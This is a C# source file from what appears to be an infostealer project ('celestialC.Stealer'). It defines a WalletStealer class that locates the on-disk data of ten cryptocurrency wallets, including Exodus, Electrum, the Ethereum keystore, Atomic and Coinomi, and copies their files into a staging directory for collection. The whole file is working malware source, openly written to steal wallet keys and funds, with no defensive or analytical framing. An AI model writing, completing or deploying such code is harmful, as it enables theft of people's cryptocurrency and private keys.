﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer.Crypto
{
    internal static class WalletStealer
    {
        static private Dictionary<string, string> _walletPaths;

        static WalletStealer()
        {
            var appdata = Environment.GetEnvironmentVariable("appdata");
            var localappdata = Environment.GetEnvironmentVariable("localappdata");

            _walletPaths = new Dictionary<string, string>()
            {
                { "Zcash", Path.Combine(appdata, "Zcash") },
                { "Armory", Path.Combine(appdata, "Armory") },
                { "Bytecoin", Path.Combine(appdata, "Bytecoin") },
                { "Jaxx", Path.Combine(appdata, "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb") },
                { "Exodus", Path.Combine(appdata, "Exodus", "exodus.wallet") },
                { "Ethereum", Path.Combine(appdata, "Ethereum", "keystore") },
                { "Electrum", Path.Combine(appdata, "Electrum", "wallets") },
                { "AtomicWallet", Path.Combine(appdata, "atomic", "Local Storage", "leveldb") },
                { "Guarda", Path.Combine(appdata, "Guarda", "Local Storage", "leveldb") },
                { "Coinomi", Path.Combine(localappdata, "Coinomi", "Coinomi", "wallets") },
            };
        }

        internal static async Task<int> StealWallets(string dst)
        {
            var count = 0;

            foreach (var item in _walletPaths)
            {
                if (Directory.Exists(item.Value))
                {
                    DirectoryInfo outDir = null;
                    var saveToDir = Path.Combine(dst, item.Key);
                    try
                    {
                        outDir = Directory.CreateDirectory(saveToDir);
                        foreach (var file in Directory.GetFiles(item.Value))
                        {
                            File.Copy(file, Path.Combine(saveToDir, Path.GetFileName(file)));
                        }
                        foreach (var dir in Directory.GetDirectories(item.Value))
                        {
                            foreach (var file in Directory.GetFiles(dir))
                            {
                                File.Copy(file, Path.Combine(saveToDir, Path.GetFileName(file)));
                            }
                        }

                        count++;
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            outDir?.Delete(true);
                        }
                        catch { }
                    }
                }
            }

            return count;
        }
    }
}
